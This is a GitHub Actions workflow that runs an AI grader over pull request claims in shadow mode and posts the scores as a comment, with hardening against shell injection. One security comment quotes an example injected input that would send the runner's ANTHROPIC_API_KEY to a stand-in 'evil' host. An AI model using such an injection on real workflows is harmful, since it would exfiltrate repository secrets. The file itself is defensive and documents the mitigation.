name: Claim Grader

# Shadow-mode AI grader for PR claim compression. Reads PR title +
# body + commit messages, runs each through the claim-grader prompt,
# and posts a single comment summarizing the scores.
#
# Shadow mode: this workflow uses `continue-on-error: true` on the
# grading job. The PR is NEVER blocked by a low score — only commented.
# After the project's 2-week calibration period, the project owner
# can opt into strict mode by:
#   - Removing `continue-on-error: true`
#   - Adding `--strict --threshold 5` (or chosen threshold) to the
#     grade_pr.py invocation
#
# Provider: defaults to Anthropic via ANTHROPIC_API_KEY repo secret.
# Falls back to OpenAI via OPENAI_API_KEY. If neither secret is set,
# the grader returns no-op informational output without failing.

on:
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
    inputs:
      pr:
        description: PR number to grade
        required: true
        type: number   # GitHub rejects non-numeric dispatch input at source

permissions:
  contents: read
  pull-requests: write   # required to post comments

concurrency:
  group: claim-grade-${{ github.event.pull_request.number || github.event.inputs.pr }}
  cancel-in-progress: true

jobs:
  grade:
    name: Grade PR claims (shadow mode)
    runs-on: ubuntu-latest
    continue-on-error: true   # SHADOW MODE — remove to block on low scores
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Run grader
        # SECURITY: `PR_NUMBER` is passed through `env:`, not interpolated as
        # `${{ }}` into the shell body. GitHub expands `${{ }}` into `run:`
        # *before* the shell parses it, so a `workflow_dispatch` input like
        # `1"; curl evil?$ANTHROPIC_API_KEY; #` would execute as script and
        # exfiltrate the runner's secrets. An env value is data, not script.
        # The `[[ =~ ^[0-9]+$ ]]` check is defence-in-depth on top of the
        # `type: number` declaration on the dispatch input.
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          GH_TOKEN: ${{ github.token }}
          PR_NUMBER: ${{ github.event.pull_request.number || github.event.inputs.pr }}
        run: |
          if [[ ! "$PR_NUMBER" =~ ^[0-9]+$ ]]; then
            echo "Refusing: PR number '$PR_NUMBER' is not numeric." >&2
            exit 1
          fi
          ./scripts/ai/grade_pr.py --pr "$PR_NUMBER" --out-json /tmp/grade.json
          # Extract the markdown summary for the PR comment.
          python3 -c "import json; d=json.load(open('/tmp/grade.json')); print(d['summary_md'])" > /tmp/grade.md

      - name: Post comment
        if: always()
        env:
          GH_TOKEN: ${{ github.token }}
          PR_NUMBER: ${{ github.event.pull_request.number || github.event.inputs.pr }}
        run: |
          if [[ ! "$PR_NUMBER" =~ ^[0-9]+$ ]]; then
            echo "Refusing: PR number '$PR_NUMBER' is not numeric." >&2
            exit 1
          fi
          if [[ -s /tmp/grade.md ]]; then
            gh pr comment "$PR_NUMBER" --body-file /tmp/grade.md
          else
            echo "No grade summary produced; skipping comment."
          fi
